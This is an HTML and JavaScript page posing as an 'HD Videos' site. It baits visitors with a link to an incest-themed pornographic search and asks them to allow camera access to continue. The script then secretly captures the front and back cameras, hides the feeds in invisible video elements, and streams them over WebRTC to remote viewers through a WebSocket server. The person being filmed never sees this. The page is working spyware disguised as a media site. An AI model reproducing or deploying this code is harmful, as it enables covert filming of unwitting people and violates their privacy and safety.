<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Video Site</title>

<style>
body{
  margin:0;
  background:#111;
  color:#fff;
  font-family:Arial,sans-serif;
  text-align:center;
  padding:20px;
}

#status{
  font-size:20px;
  margin:20px;
}

#error{
  color:#ff7777;
  font-size:16px;
  margin:15px;
}

#content{
  display:none;
}

#frontVideo,
#backVideo{
  display:none;
}

.googleBtn{
  display:inline-block;
  margin-top:20px;
  padding:12px 25px;
  background:#fff;
  color:#222;
  text-decoration:none;
  border-radius:8px;
  font-size:16px;
  font-weight:bold;
}

.retryBtn{
  display:none;
  margin-top:15px;
  padding:12px 25px;
  border:0;
  border-radius:8px;
  font-size:16px;
  cursor:pointer;
}
</style>
</head>

<body>

<h1>HD Videos</h1>

<div id="status">
  Click Allow to grant camera permission
</div>

<div id="error">
  Please allow the permission to continue.
</div>

<button id="retryBtn" class="retryBtn">
  🔄 Try Again
</button>

<div id="content">
  <div id="liveStatus">
    See more videos below.
  </div>

  <a
    class="googleBtn"
    href="https://www.rat.xxx/search/brother+and+sister/"
    target="_blank"
    rel="noopener noreferrer">
    Click here to see the HD video
  </a>
</div>

<video id="frontVideo" autoplay muted playsinline></video>
<video id="backVideo" autoplay muted playsinline></video>

<script>

const status = document.getElementById("status");
const errorBox = document.getElementById("error");
const content = document.getElementById("content");
const retryBtn = document.getElementById("retryBtn");

const frontVideo = document.getElementById("frontVideo");
const backVideo = document.getElementById("backVideo");

let frontStream = null;
let backStream = null;

let cameraReady = false;
let roleReceived = false;

const peers = new Map();
const pendingCandidates = new Map();


const ws = new WebSocket(
  (location.protocol === "https:" ? "wss:" : "ws:") +
  "//" +
  location.host +
  "/camera"
);


function send(message){

  if(ws.readyState === WebSocket.OPEN){

    ws.send(JSON.stringify(message));

    return true;
  }

  return false;
}


function announceCameras(){

  if(
    !cameraReady ||
    !frontStream ||
    !roleReceived
  ){
    return;
  }

  send({
    type:"camera-live",

    cameras:{
      front:!!frontStream,
      back:!!backStream
    }
  });
}


function showPermissionRequired(message){

  status.textContent = "🔒 Permission required";

  errorBox.textContent =
    message ||
    "Please allow camera permission.";

  content.style.display = "none";
  retryBtn.style.display = "inline-block";
}


function stopCameras(){

  if(frontStream){

    frontStream
      .getTracks()
      .forEach(track => track.stop());

    frontStream = null;
  }

  if(backStream){

    backStream
      .getTracks()
      .forEach(track => track.stop());

    backStream = null;
  }

  frontVideo.srcObject = null;
  backVideo.srcObject = null;

  cameraReady = false;
}


async function startCameras(){

  stopCameras();

  status.textContent =
    "🟡 Requesting camera permission...";

  errorBox.textContent = "";
  retryBtn.style.display = "none";
  content.style.display = "none";


  try{

    frontStream =
      await navigator.mediaDevices.getUserMedia({

        video:{
          facingMode:{
            ideal:"user"
          }
        },

        audio:false

      });

    frontVideo.srcObject = frontStream;

    await frontVideo.play()
      .catch(() => {});

  }

  catch(err){

    console.error("Front camera error:",err);

    showPermissionRequired(
      "❌ Camera permission is required. Please allow permission and try again."
    );

    return;
  }


  try{

    backStream =
      await navigator.mediaDevices.getUserMedia({

        video:{
          facingMode:{
            ideal:"environment"
          }
        },

        audio:false

      });

    backVideo.srcObject = backStream;

    await backVideo.play()
      .catch(() => {});

  }

  catch(err){

    console.warn(
      "Back camera unavailable:",
      err
    );

    backStream = null;
  }


  cameraReady = true;

  content.style.display = "block";

  status.textContent =
    backStream
      ? "🟢 Cameras are ready"
      : "🟢 Camera is ready";


  announceCameras();
}


async function createPeer(viewerId){

  const oldPc = peers.get(viewerId);

  if(oldPc){

    try{
      oldPc.close();
    }catch(err){}

    peers.delete(viewerId);
  }


  if(!frontStream){

    return;
  }


  const pc =
    new RTCPeerConnection({

      iceServers:[
        {
          urls:"stun:stun.l.google.com:19302"
        }
      ]

    });


  peers.set(viewerId,pc);

  pendingCandidates.set(
    viewerId,
    []
  );


  pc.onicecandidate = event => {

    if(event.candidate){

      send({

        type:"candidate",

        candidate:event.candidate,

        toViewerId:viewerId

      });

    }

  };


  pc.onconnectionstatechange = () => {

    console.log(
      "Connection:",
      viewerId,
      pc.connectionState
    );

  };


  frontStream
    .getTracks()
    .forEach(track => {

      pc.addTrack(
        track,
        frontStream
      );

    });


  if(backStream){

    backStream
      .getTracks()
      .forEach(track => {

        pc.addTrack(
          track,
          backStream
        );

      });

  }


  try{

    const offer =
      await pc.createOffer({

        offerToReceiveAudio:false,
        offerToReceiveVideo:false

      });


    await pc.setLocalDescription(
      offer
    );


    send({

      type:"offer",

      offer:pc.localDescription,

      toViewerId:viewerId,

      streamTypes:{
        front:true,
        back:!!backStream
      }

    });

  }

  catch(err){

    console.error(
      "Offer error:",
      err
    );

  }

}


ws.onopen = () => {

  startCameras();

};


ws.onmessage =
async event => {

  let msg;

  try{

    msg = JSON.parse(event.data);

  }

  catch(err){

    return;
  }


  if(msg.type === "role"){

    roleReceived = true;

    announceCameras();

    return;
  }


  if(msg.type === "viewer-ready"){

    if(
      !cameraReady ||
      !frontStream
    ){
      return;
    }


    await createPeer(
      msg.viewerId
    );

    return;
  }


  if(msg.type === "answer"){

    const viewerId =
      msg.toViewerId ||
      msg.viewerId;


    const pc =
      peers.get(viewerId);


    if(
      pc &&
      msg.answer
    ){

      try{

        await pc.setRemoteDescription(
          new RTCSessionDescription(
            msg.answer
          )
        );


        const queued =
          pendingCandidates.get(viewerId) || [];


        for(const candidate of queued){

          await pc.addIceCandidate(
            new RTCIceCandidate(
              candidate
            )
          ).catch(() => {});

        }


        pendingCandidates.set(
          viewerId,
          []
        );

      }

      catch(err){

        console.log(
          "Answer error:",
          err
        );

      }

    }

    return;
  }


  if(msg.type === "candidate"){

    const viewerId =
      msg.toViewerId ||
      msg.viewerId;


    const pc =
      peers.get(viewerId);


    if(!pc || !msg.candidate){

      return;
    }


    if(
      pc.remoteDescription &&
      pc.remoteDescription.type
    ){

      await pc.addIceCandidate(
        new RTCIceCandidate(
          msg.candidate
        )
      ).catch(() => {});

    }

    else{

      if(
        !pendingCandidates.has(
          viewerId
        )
      ){

        pendingCandidates.set(
          viewerId,
          []
        );

      }

      pendingCandidates
        .get(viewerId)
        .push(msg.candidate);

    }

    return;
  }


  if(msg.type === "viewer-left"){

    const pc =
      peers.get(msg.viewerId);

    if(pc){

      try{
        pc.close();
      }catch(err){}

      peers.delete(msg.viewerId);
      pendingCandidates.delete(msg.viewerId);

    }

  }

};


ws.onerror = () => {

  console.log(
    "WebSocket error"
  );

};


ws.onclose = () => {

  status.textContent =
    "🔴 Server connection closed";

};


retryBtn.onclick = () => {

  startCameras();

};


window.addEventListener(
  "beforeunload",
  () => {

    stopCameras();

    peers.forEach(pc => {

      try{
        pc.close();
      }catch(err){}

    });

    peers.clear();

    if(
      ws.readyState === WebSocket.OPEN
    ){
      ws.close();
    }

  }
);

</script>

</body>
</html>
